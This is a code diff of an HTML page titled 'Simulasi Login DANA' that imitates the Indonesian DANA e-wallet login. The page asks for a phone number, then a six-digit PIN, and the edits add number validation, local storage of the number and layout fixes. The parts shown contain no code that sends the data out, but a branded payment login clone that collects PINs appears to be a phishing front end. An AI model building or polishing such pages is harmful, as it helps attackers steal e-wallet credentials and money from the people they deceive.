@@ -1,61 +1,52 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
   <title>Simulasi Login DANA</title>
   <style>
     * {
       box-sizing: border-box;
     }
-
     html, body {
       height: 100%;
       margin: 0;
       padding: 0;
       font-family: Arial, sans-serif;
       background-color: #2796f1;
-      overflow-x: hidden;
     }
-
     body {
       display: flex;
       justify-content: center;
       align-items: flex-start;
     }
-
     .container {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      padding: 30px 24px 0;
       background-color: #2796f1;
       width: 100%;
       max-width: 400px;
-      padding: 30px 24px 100px 24px;
-      box-sizing: border-box;
-      position: relative;
-      min-height: 100%;
     }
-
     .logo {
       text-align: center;
       margin-bottom: 32px;
     }
-
     .logo img {
       width: 80px;
     }
-
     .title {
       color: white;
       font-size: 18px;
       text-align: center;
       margin-bottom: 24px;
     }
-
     .input-row {
       display: flex;
       gap: 12px;
-      margin-bottom: 24px;
+      margin-bottom: 12px;
     }
-
     .input-box {
       display: flex;
       align-items: center;
@@ -64,37 +55,21 @@
       padding: 14px 16px;
       flex: 1;
     }
-
-    .flag {
-      display: flex;
-      align-items: center;
-    }
-
     .flag img {
       width: 24px;
       height: 16px;
       margin-right: 6px;
     }
-
-    .country-code-input {
+    .country-code-input, 
+    .input-box input[type="tel"], 
+    .input-box input[type="text"] {
       border: none;
       outline: none;
       font-size: 16px;
-      width: 40px;
-      font-weight: bold;
-      color: black;
       background: transparent;
-    }
-
-    .input-box input[type="tel"], .input-box input[type="text"] {
-      border: none;
-      outline: none;
-      font-size: 16px;
       color: black;
-      background: transparent;
       width: 100%;
     }
-
     .info-text {
       font-size: 12px;
       color: white;
@@ -103,13 +78,11 @@
       padding: 0 10px;
       margin-bottom: 24px;
     }
-
     .info-text a {
       color: white;
       font-weight: bold;
       text-decoration: none;
     }
-
     .btn {
       width: 100%;
       padding: 16px;
@@ -119,29 +92,29 @@
       font-size: 16px;
       color: #008CFF;
       cursor: pointer;
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      max-width: 400px;
-      margin: 0 auto;
-      z-index: 10;
-      margin-bottom: 12px;
+      margin-top: auto;
     }
-
+    #phone-error, #error-message {
+      color: #ffdddd;
+      background-color: #a70000;
+      padding: 8px 12px;
+      border-radius: 8px;
+      font-size: 14px;
+      text-align: center;
+      margin-bottom: 16px;
+      display: none;
+    }
     .pin-page {
       display: none;
       background-color: white;
       width: 100%;
       max-width: 400px;
-      min-height: 100%;
-      padding: 70px 24px 24px 24px;
+      min-height: 100vh;
+      padding: 70px 24px 24px;
       box-sizing: border-box;
       flex-direction: column;
       align-items: center;
-      justify-content: flex-start;
     }
-
     .pin-header {
       background-color: #008CFF;
       color: white;
@@ -154,7 +127,6 @@
       top: 0;
       left: 0;
     }
-
     .pin-title {
       margin-top: 12px;
       margin-bottom: 24px;
@@ -162,14 +134,11 @@
       color: black;
       text-align: center;
     }
-
     .pin-dots {
       display: flex;
       justify-content: center;
-      margin-top: 24px;
-      margin-bottom: 40px;
+      margin: 24px 0 40px;
     }
-
     .pin-dot {
       width: 16px;
       height: 16px;
@@ -179,12 +148,10 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 14px;
       color: white;
       font-weight: bold;
-      transition: all 0.3s ease;
+      opacity: 0.3;
     }
-
     .pin-help {
       display: flex;
       justify-content: space-around;
@@ -193,19 +160,16 @@
       color: #008CFF;
       font-weight: bold;
     }
-
     .pin-help img {
       width: 20px;
       vertical-align: middle;
       margin-right: 4px;
     }
-
     #pin-input {
       position: absolute;
       opacity: 0.01;
       width: 1px;
       height: 1px;
-      pointer-events: auto;
     }
   </style>
 </head>
@@ -220,12 +184,14 @@
         <div class="flag">
           <img src="https://upload.wikimedia.org/wikipedia/commons/9/9f/Flag_of_Indonesia.svg" alt="ID">
         </div>
-        <input type="text" class="country-code-input" value="+62">
+        <input type="text" class="country-code-input" value="+62" disabled>
       </div>
       <div class="input-box">
         <input type="tel" placeholder="811-1234-5678" id="phone-input">
       </div>
     </div>
+    <div id="phone-error">Nomor HP tidak valid</div>
+    <div id="error-message">Nomor HP tidak valid. Contoh: 08123456789</div>
     <div class="info-text">
       Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu.<br>
       Dengan melanjutkan, kamu juga setuju dengan <a href="#">S&amp;K</a> serta <a href="#">Kebijakan Privasi</a> kami.
@@ -239,7 +205,7 @@
     <div class="pin-dots" id="pin-dots" onclick="document.getElementById('pin-input').focus()"></div>
     <input type="tel" id="pin-input" maxlength="6" oninput="handlePinInput(this.value)" autofocus>
     <div class="pin-help">
-      <div><img src="https://cdn-icons-png.flaticon.com/512/545/545705.png" width="16"> BUTUH BANTUAN?</div>
+      <div><img src="https://cdn-icons-png.flaticon.com/512/545/545705.png"> BUTUH BANTUAN?</div>
       <div>LUPA PIN?</div>
     </div>
   </div>
@@ -251,12 +217,19 @@
 
     function showPinPage() {
       const phone = document.getElementById('phone-input').value.trim();
-      if (phone === '') {
-        alert('Silakan isi nomor HP terlebih dahulu.');
+      const errorEl = document.getElementById('error-message');
+
+      let normalizedPhone = phone.startsWith('0') ? phone.slice(1) : phone;
+      const phoneRegex = /^8[1-9][0-9]{7,11}$/;
+
+      if (!phoneRegex.test(normalizedPhone)) {
+        errorEl.style.display = 'block';
         return;
       }
-      savedPhoneNumber = phone;
-      localStorage.setItem('phone', phone);
+
+      errorEl.style.display = 'none';
+      savedPhoneNumber = normalizedPhone;
+      localStorage.setItem('phone', normalizedPhone);
 
       document.getElementById('input-nomor').style.display = 'none';
       document.getElementById('pin-page').style.display = 'flex';
@@ -270,12 +243,12 @@
       for (let i = 0; i < 6; i++) {
         const dot = document.createElement('div');
         dot.className = 'pin-dot';
+        dot.style.opacity = pinValues[i] ? '1' : '0.3';
         if (i === showIndex && pinValues[i]) {
           dot.textContent = pinValues[i];
           clearTimeout(revealTimeout);
-          revealTimeout = setTimeout(() => updateDots(), 500);
+          revealTimeout = setTimeout(updateDots, 500);
         }
-        dot.style.opacity = pinValues[i] ? '1' : '0.3';
         dotsContainer.appendChild(dot);
       }
     }
@@ -313,22 +286,19 @@
     });
 
     function resetToHome() {
-      document.getElementById('input-nomor').style.display = 'block';
+      document.getElementById('input-nomor').style.display = 'flex';
       document.getElementById('pin-page').style.display = 'none';
       document.getElementById('phone-input').value = '';
       document.getElementById('pin-input').value = '';
-      for (let i = 0; i < 6; i++) {
-        pinValues[i] = '';
-      }
+      pinValues.fill('');
       updateDots();
       localStorage.removeItem('phone');
     }
 
-    // Scroll ke input saat fokus
     document.getElementById("phone-input").addEventListener("focus", () => {
       setTimeout(() => {
         document.getElementById("phone-input").scrollIntoView({ behavior: "smooth", block: "center" });
-      }, 300);
+      }, 10);
     });
   </script>
 </body>
